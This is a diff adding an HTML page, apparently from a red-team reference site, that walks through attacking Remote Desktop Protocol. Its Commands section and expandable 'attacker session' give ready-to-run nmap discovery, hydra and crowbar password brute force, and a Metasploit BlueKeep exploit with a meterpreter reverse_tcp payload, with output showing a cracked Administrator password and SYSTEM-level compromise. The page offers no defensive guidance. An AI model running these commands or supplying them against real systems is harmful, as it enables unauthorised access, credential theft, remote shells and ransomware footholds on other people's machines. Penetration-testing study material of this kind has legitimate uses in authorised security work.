@@ -1,0 +1,187 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">RDP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Remote Access</strong> • Focus: <strong>RDP Abuse & Unauthorized Access</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Remote Desktop Protocol (RDP, TCP/3389) allows users to connect and control 
+    Windows systems remotely. Attackers exploit RDP through brute-force attacks, 
+    credential stuffing, man-in-the-middle interception, and by abusing critical 
+    vulnerabilities such as BlueKeep. Once inside, RDP gives attackers interactive 
+    desktop access, enabling lateral movement, persistence, and ransomware delivery. 
+    In Red Team operations, RDP exploitation is a common path to domain-wide compromise.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Internet Exposure:</strong> Many organizations leave RDP open to the internet.</li>
+    <li><strong>Weak Credentials:</strong> Users often choose guessable or reused passwords.</li>
+    <li><strong>No MFA:</strong> RDP usually lacks multi-factor authentication.</li>
+    <li><strong>High-Value Access:</strong> Direct GUI access enables full control over systems.</li>
+    <li><strong>Vulnerabilities:</strong> Exploits like BlueKeep, DejaBlue, and CredSSP flaws allow unauthenticated RCE.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify RDP service on TCP/3389.</li>
+    <li><strong>Brute Force / Credential Stuffing:</strong> Attempt weak passwords or leaked creds.</li>
+    <li><strong>Exploit Vulnerabilities:</strong> Use BlueKeep/DejaBlue or MITM attacks to bypass auth.</li>
+    <li><strong>Access & Persistence:</strong> Establish RDP sessions with stolen creds or backdoors.</li>
+    <li><strong>Impact:</strong> Full interactive access, lateral movement, ransomware deployment.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and fingerprint RDP on TCP/3389.</li>
+    <li>Attempt brute force or password spraying.</li>
+    <li>Test for known RDP vulnerabilities (e.g., BlueKeep).</li>
+    <li>Login with valid creds using RDP clients.</li>
+    <li>Escalate privileges, move laterally, and exfiltrate data.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p3389 --script rdp* [target]
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -L users.txt -P passwords.txt rdp://[target]
+crowbar -b rdp -s [target]/32 -u admin -C passwords.txt
+
+# ------------------------------
+# Exploit BlueKeep (CVE-2019-0708)
+# ------------------------------
+msfconsole
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS [target]
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+# ------------------------------
+# Connect with Valid Credentials
+# ------------------------------
+xfreerdp /v:[target] /u:Administrator /p:Password123
+rdesktop [target] -u Administrator -p Password123
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p3389 --script rdp-enum-encryption 192.168.1.80
+hydra -L users.txt -P rockyou.txt rdp://192.168.1.80
+xfreerdp /v:192.168.1.80 /u:alice /p:Summer2025!
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p3389 --script rdp-enum-encryption 192.168.1.80
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+| rdp-enum-encryption: 
+|   Security layer: RDP Security
+|   RDP Encryption level: Client Compatible
+|   SSL Protocols Supported: TLS 1.0
+
+[ saide ~ ]$ hydra -l Administrator -P rockyou.txt rdp://192.168.1.80
+[3389][rdp] host: 192.168.1.80   login: Administrator   password: Summer2025!
+
+[ saide ~ ]$ xfreerdp /v:192.168.1.80 /u:Administrator /p:Summer2025!
+[+] Connected to WIN-SERVER via RDP
+[+] Full GUI access obtained
+
+[ saide ~ ]$ msfconsole
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS 192.168.1.80
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+[*] Exploit completed, session 1 opened
+meterpreter > sysinfo
+Computer    : WIN-SERVER
+OS          : Windows Server 2016
+Architecture: x64
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample RDP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+3389/tcp open  ms-wbt-server
+
+# Weak Credentials
+Administrator : Summer2025!
+
+# Exploitation
+Successful RDP login → full GUI access
+BlueKeep exploit → meterpreter shell
+
+# Proof of Exploitation
+Remote Windows Server 2016 compromised with SYSTEM access
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting RDP
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1076/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Remote Desktop Protocol
+      </a>
+    </li>
+    <li>
+      <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MSRC – BlueKeep Advisory
+      </a>
+    </li>
+    <li>Red Team workflow: Scan → Brute/Leak creds → Login → Exploit vuln → Pivot laterally → Persistence.</li>
+  </ul>
+</section>
